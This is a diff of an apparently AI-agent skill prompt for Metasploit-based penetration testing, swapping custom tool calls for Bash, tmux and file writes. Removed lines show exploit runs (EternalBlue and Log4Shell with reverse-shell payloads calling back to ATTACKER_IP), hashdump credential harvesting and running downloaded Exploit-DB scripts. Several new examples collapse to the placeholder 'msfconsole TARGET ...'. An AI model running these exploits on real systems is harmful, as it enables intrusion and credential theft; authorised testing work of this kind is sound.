@@ -20,16 +20,16 @@ You are an expert penetration tester using Metasploit Framework to validate and 
 
 Read this before executing any workflow phase. Commit to MANDATORY chains before your first tool call.
 
-| Trigger | Chain | Mandatory? | Claude Code | opencode |
-|---------|-------|-----------|-------------|---------|
-| Meterpreter / shell session obtained | `/post-exploit` | **MANDATORY** | `Skill(skill="post-exploit")` | `cat ~/.config/opencode/commands/post-exploit.md` |
-| After `session(action="complete")` | `/gh-export` | **MANDATORY** | `Skill(skill="gh-export")` | `cat ~/.config/opencode/commands/gh-export.md` |
-| Shell in container / K8s pod | `/container-k8s-security` | OPTIONAL | `Skill(skill="container-k8s-security")` | `cat ~/.config/opencode/commands/container-k8s-security.md` |
+| Trigger | Chain | Mandatory? | Claude Code |
+|------|------|------|------|
+| Meterpreter / shell session obtained | `/post-exploit` | **MANDATORY** | `Skill(skill="post-exploit")` |
+| After `Write("pentest/summary.md", "<summary>")` | `/gh-export` | **MANDATORY** | `Skill(skill="gh-export")` |
+| Shell in container / K8s pod | `/container-k8s-security` | OPTIONAL | `Skill(skill="container-k8s-security")` |
 
-**You WILL invoke `/post-exploit` the moment a session is opened. You WILL invoke `/gh-export` after `session(action="complete")`.**
+**You WILL invoke `/post-exploit` the moment a session is opened. You WILL invoke `/gh-export` after `Write("pentest/summary.md", "<summary>")`.**
 
 
-**Logging:** Before invoking any skill above, call `session(action="set_skill", options={"skill":"<name>","reason":"<why>","chained_from":"<this-skill>"})` — this writes the SKILL_CHAIN entry to pentest.log.
+**Logging:** Before invoking any skill above, call `Bash("echo 'SKILL_CHAIN <skill> <reason> chained_from=<this>' >> pentest/skill_chain.log")` — this writes the SKILL_CHAIN entry to pentest.log.
 
 ---
 
@@ -37,46 +37,28 @@ Read this before executing any workflow phase. Commit to MANDATORY chains before
 
 | Tool | Use for |
 |------|---------|
-| `session(action="start", options={...})` | Define target, scope, depth, and hard limits — **always call this first** |
-| `session(action="complete", options={...})` | Mark the scan done and write final notes |
-| `run_metasploit` | Run Metasploit modules — `scan(tool="metasploit", target=HOST, options={module, payload, rport, lhost, lport, extra})` |
-| `start_metasploit` | Pre-warm the Metasploit container — `session(action="start_metasploit")` |
-| `stop_metasploit` | Stop the container — `session(action="stop_metasploit")` |
-| `kali(command=...)` | Kali tools for auxiliary tasks (nmap verification, file inspection) |
-| `http(action="request", ...)` | Manual HTTP verification of web exploits |
-| `http(action="save_poc", ...)` | Save confirmed exploits as `.http` files in `pocs/` |
-| `report(action="finding", data={...})` | Log confirmed vulnerabilities to findings.json |
-| `report(action="diagram", data={...})` | Save attack path diagrams |
-| `report(action="dashboard", data={"port": 5000})` | Serve dashboard.html at localhost:5000 |
-| `report(action="note", data={...})` | Write reasoning notes to session log |
+| `Bash("<cmd>")` | Any Kali tool — nmap, naabu, httpx, nuclei, ffuf, katana, subfinder, semgrep, trufflehog, sqlmap, nikto, hydra, gobuster, testssl, enum4linux-ng, theHarvester, dnsrecon, certipy, nxc, impacket, searchsploit, … (everything is on PATH on Kali). Also `curl` for raw HTTP probes. |
+| `Write("pocs/<name>.http", ...)` | Save a confirmed exploit as a raw `.http` file under `pocs/` (paste-ready for Burp Repeater). |
+| `Write("pentest/diagrams/<name>.mmd", ...)` | Save a Mermaid architecture/network diagram. |
+| `Read` + `Write` `pentest/findings.json` | Append a confirmed vulnerability (with evidence) to `pentest/findings.json` — read, mutate the JSON array, write back. |
+| `Read` + `Write` `pentest/coverage.json` | Upsert an endpoint/test cell in the coverage matrix. |
+| `Bash("echo ... >> pentest/notes.log")` | Append a reasoning note or decision to the running session log. |
+| `Bash("tmux new-session ...")` + `tmux send-keys` / `tmux capture-pane` | Drive interactive tools that need a live PTY — msfconsole, evil-winrm, responder, listeners. |
 
 ### How to invoke Metasploit modules
 
 ```
-scan(tool="metasploit", target="10.0.0.5", options={
-  "module": "exploit/multi/http/apache_log4shell",
-  "payload": "java/shell_reverse_tcp",
-  "rport": "8080",
-  "lhost": "10.0.0.1",
-  "lport": "4444"
-})
+Bash("msfconsole 10.0.0.5 ...")
 ```
 
 For auxiliary/scanner modules (no payload needed):
 ```
-scan(tool="metasploit", target="10.0.0.5", options={
-  "module": "auxiliary/scanner/smb/smb_ms17_010"
-})
+Bash("msfconsole 10.0.0.5 ...")
 ```
 
 For complex setups, use `extra` for additional `set` commands (semicolon-separated):
 ```
-scan(tool="metasploit", target="10.0.0.5", options={
-  "module": "exploit/windows/smb/ms17_010_eternalblue",
-  "payload": "windows/x64/meterpreter/reverse_tcp",
-  "lhost": "10.0.0.1",
-  "extra": "set SMBUser admin; set SMBPass password123"
-})
+Bash("msfconsole 10.0.0.5 ...")
 ```
 
 ---
@@ -110,10 +92,10 @@ If the request does not specify a CVE or target service, ask the user:
 
 ### Phase 0 — Scope & Setup
 
-0. Call `session(action="start", options={...})` with target, depth, and limits
-1. Call `report(action="dashboard", data={"port": 5000})` — live findings tracker
-2. Call `session(action="start_metasploit")` — pre-warm the container
-3. Call `report(action="note", data={...})` — record target, CVE, service, available credentials
+0. Call `Bash("mkdir -p pentest/{pocs,diagrams}") + Write("pentest/scope.json", {...})` with target, depth, and limits
+1. Call `# (no dashboard — see pentest/findings.json directly)` — live findings tracker
+2. `Bash("tmux new-session -d -s msf 'msfconsole -q'")` — start a persistent msfconsole in tmux so subsequent `tmux send-keys` / `tmux capture-pane` calls drive the same REPL
+3. Call `Bash("echo '<message>' >> pentest/notes.log")` — record target, CVE, service, available credentials
 
 ---
 
@@ -121,48 +103,42 @@ If the request does not specify a CVE or target service, ask the user:
 
 **Search Exploit-DB first** (faster than MSF search, covers non-MSF exploits too):
 ```
-kali(command="searchsploit saltstack 3000")
-kali(command="searchsploit --cve CVE-2021-44228")
+Bash("searchsploit saltstack 3000")
+Bash("searchsploit --cve CVE-2021-44228")
 ```
 
 **If no MSF module exists but a standalone exploit is available**, mirror and run it via Kali:
 ```
-kali(command="searchsploit -m 48421")                    # download to /tmp/
-kali(command="head -30 /tmp/48421.py")                   # review the script
-kali(command="python3 /tmp/48421.py --master TARGET")    # run it
+Bash("searchsploit -m 48421")                    # download to /tmp/
+Bash("head -30 /tmp/48421.py")                   # review the script
+Bash("python3 /tmp/48421.py --master TARGET")    # run it
 ```
 
 **Then search Metasploit modules:**
 ```
-scan(tool="metasploit", target="TARGET", options={
-  "module": "",
-  "extra": "search CVE-YYYY-NNNNN; exit"
-})
+Bash("msfconsole TARGET ...")
 ```
 
 **Or search by service/keyword:**
 ```
-scan(tool="metasploit", target="TARGET", options={
-  "module": "",
-  "extra": "search type:exploit name:apache; exit"
-})
+Bash("msfconsole TARGET ...")
 ```
 
 **Always do your own lookup** — the Metasploit database has thousands of modules. Never assume a CVE isn't covered. Use these search strategies:
 
 ```
 # By CVE number (most reliable)
-scan(tool="metasploit", target="TARGET", options={"module":"", "extra":"search cve:2009-3103; exit"})
+Bash("msfconsole TARGET ...")
 
 # By service + keyword
-scan(tool="metasploit", target="TARGET", options={"module":"", "extra":"search type:exploit name:smb platform:windows; exit"})
+Bash("msfconsole TARGET ...")
 
 # By product name
-scan(tool="metasploit", target="TARGET", options={"module":"", "extra":"search zoneminder; exit"})
+Bash("msfconsole TARGET ...")
 
 # Also check Exploit-DB (covers non-MSF exploits)
-kali(command="searchsploit --cve CVE-2009-3103")
-kali(command="searchsploit opensmtpd 2.0")
+Bash("searchsploit --cve CVE-2009-3103")
+Bash("searchsploit opensmtpd 2.0")
 ```
 
 **Example lookups** (to show the pattern — do not treat as an exhaustive list):
@@ -181,19 +157,14 @@ kali(command="searchsploit opensmtpd 2.0")
 
 **Run auxiliary scanner modules to confirm vulnerability without exploiting:**
 ```
-scan(tool="metasploit", target="TARGET", options={
-  "module": "auxiliary/scanner/smb/smb_ms17_010"
-})
+Bash("msfconsole TARGET ...")
 ```
 
 ```
-scan(tool="metasploit", target="TARGET", options={
-  "module": "auxiliary/scanner/http/log4shell_scanner",
-  "rport": "8080"
-})
+Bash("msfconsole TARGET ...")
 ```
 
-Call `report(action="finding", data={...})` for every confirmed vulnerable service. If depth is `quick`, stop here.
+Call `# Append finding to pentest/findings.json (Read → mutate JSON array → Write)` for every confirmed vulnerable service. If depth is `quick`, stop here.
 
 ---
 
@@ -212,15 +183,10 @@ Call `report(action="finding", data={...})` for every confirmed vulnerable servi
 
 **Run the exploit:**
 ```
-scan(tool="metasploit", target="TARGET", options={
-  "module": "exploit/windows/smb/ms17_010_eternalblue",
-  "payload": "windows/x64/meterpreter/reverse_tcp",
-  "lhost": "ATTACKER_IP",
-  "lport": "4444"
-})
+Bash("msfconsole TARGET ...")
 ```
 
-Call `report(action="finding", data={...})` with the full Metasploit output as evidence.
+Call `# Append finding to pentest/findings.json (Read → mutate JSON array → Write)` with the full Metasploit output as evidence.
 
 ---
 
@@ -228,18 +194,12 @@ Call `report(action="finding", data={...})` with the full Metasploit output as e
 
 If exploitation succeeds, gather evidence:
 ```
-scan(tool="metasploit", target="TARGET", options={
-  "module": "",
-  "extra": "sessions -l; exit"
-})
+Bash("msfconsole TARGET ...")
 ```
 
 **Meterpreter post modules:**
 ```
-scan(tool="metasploit", target="TARGET", options={
-  "module": "",
-  "extra": "sessions -i 1 -c 'sysinfo'; sessions -i 1 -c 'getuid'; sessions -i 1 -c 'hashdump'; exit"
-})
+Bash("msfconsole TARGET ...")
 ```
 
 Chain into `/post-exploit` for full privilege escalation and credential harvesting.
@@ -250,18 +210,12 @@ Chain into `/post-exploit` for full privilege escalation and credential harvesti
 
 **Generate payloads with msfvenom:**
 ```
-scan(tool="metasploit", target="TARGET", options={
-  "module": "",
-  "extra": "exit"
-})
+Bash("msfconsole TARGET ...")
 ```
 Then use the container directly:
 ```
 # Via metasploit container
-scan(tool="metasploit", target="TARGET", options={
-  "module": "",
-  "extra": "exit"
-})
+Bash("msfconsole TARGET ...")
 ```
 
 Or chain into `/reverse-shell` for payload generation with listener setup — it covers all platforms and encodings.
@@ -270,8 +224,8 @@ Or chain into `/reverse-shell` for payload generation with listener setup — it
 
 ### Phase 6 — Report & Wrap-Up
 
-1. Call `report(action="diagram", data={...})` with exploitation attack path
-2. Call `report(action="note", data={...})` with exploitation summary:
+1. Call `Write("pentest/diagrams/<title>.mmd", "<mermaid>")` with exploitation attack path
+2. Call `Bash("echo '<message>' >> pentest/notes.log")` with exploitation summary:
 ```
 Metasploit Exploitation Summary:
   Target:          [host/IP]
@@ -282,8 +236,8 @@ Metasploit Exploitation Summary:
   Privilege level: [user/root/SYSTEM]
   Post-exploit:    [hashdump/sysinfo/pivoting]
 ```
-3. Call `session(action="stop_metasploit")` — clean up container
-4. Call `session(action="complete", options={...})` with summary
+3. `Bash("tmux send-keys -t msf 'exit' Enter; tmux kill-session -t msf")` — close the msfconsole tmux session
+4. Call `Write("pentest/summary.md", "<summary>")` with summary
 5. **Export GitHub Issues** — invoke the `/gh-export` skill
 
 ---
@@ -296,7 +250,7 @@ Metasploit Exploitation Summary:
 | `/post-exploit` | Exploitation succeeded — privilege escalation, credential harvesting |
 | `/lateral-movement` | Credentials obtained — move through the network |
 | `/credential-audit` | Need to crack hashes or test credentials |
-| `/gh-export` | Always — after `session(action="complete", options={...})` |
+| `/gh-export` | Always — after `Write("pentest/summary.md", "<summary>")` |
 
 ---
 
@@ -313,12 +267,12 @@ Metasploit Exploitation Summary:
 
 ## Rules
 
-- **`session(action="start", options={...})` is mandatory** — never run any other tool before it
+- **`Bash("mkdir -p pentest/{pocs,diagrams}") + Write("pentest/scope.json", {...})` is mandatory** — never run any other tool before it
 - **Start with auxiliary scanners** — always validate before exploiting
 - **Stay within scope** — only exploit authorized targets
 - **Use safe payloads first** — `cmd/unix/generic` with `set CMD id` before reverse shells
-- **Document every module run** — call `report(action="note", data={...})` before and after each module
-- **Call `report(action="finding", data={...})` for every confirmed vulnerability** — include full MSF output
-- **Stop the Metasploit container when done** — `session(action="stop_metasploit")`
+- **Document every module run** — call `Bash("echo '<message>' >> pentest/notes.log")` before and after each module
+- **Call `# Append finding to pentest/findings.json (Read → mutate JSON array → Write)` for every confirmed vulnerability** — include full MSF output
+- **Close the msfconsole tmux session when done** — `Bash("tmux kill-session -t msf")`
 - **Never fabricate findings** — only report what Metasploit output confirms
 - **Mermaid syntax rules**: use `flowchart TD`, quote labels, no em-dashes, short alphanumeric node IDs
